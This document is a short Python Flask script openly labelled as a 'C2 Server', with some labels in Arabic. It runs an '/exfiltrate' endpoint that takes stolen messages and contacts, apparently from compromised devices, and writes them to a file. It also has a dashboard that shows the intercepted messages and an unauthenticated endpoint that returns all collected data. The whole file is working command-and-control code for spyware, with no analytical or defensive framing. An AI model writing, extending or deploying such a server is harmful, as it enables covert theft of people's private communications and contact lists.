from flask import Flask, request, jsonify
import json
import datetime
import os

app = Flask(__name__)

data = {"messages": [], "contacts": [], "logs": []}

if os.path.exists('data.json'):
    with open('data.json', 'r') as f:
        data = json.load(f)

@app.route('/')
def dashboard():
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Dashboard</title>
        <meta http-equiv="refresh" content="10">
        <style>
            body {{ background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }}
            .msg {{ border-bottom: 1px solid #333; padding: 8px; }}
        </style>
    </head>
    <body>
        <h1>🔴 C2 Server</h1>
        <h2>📨 الرسائل ({len(data['messages'])})</h2>
        {''.join([f'<div class="msg"><strong>{m.get("from","?")}</strong> → {m.get("to","?")}<br>{m.get("body","")}</div>' for m in data['messages'][-30:]])}
    </body>
    </html>
    """

@app.route('/exfiltrate', methods=['POST'])
def exfiltrate():
    d = request.json
    if d.get('messages'):
        data['messages'].extend(d['messages'])
    if d.get('contacts'):
        data['contacts'].extend(d['contacts'])
    
    with open('data.json', 'w') as f:
        json.dump(data, f, indent=2)
    
    print(f"[{datetime.datetime.now()}] استقبال {len(d.get('messages', []))} رسالة")
    return jsonify({"status": "ok"})

@app.route('/api/data', methods=['GET'])
def get_data():
    return jsonify(data)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)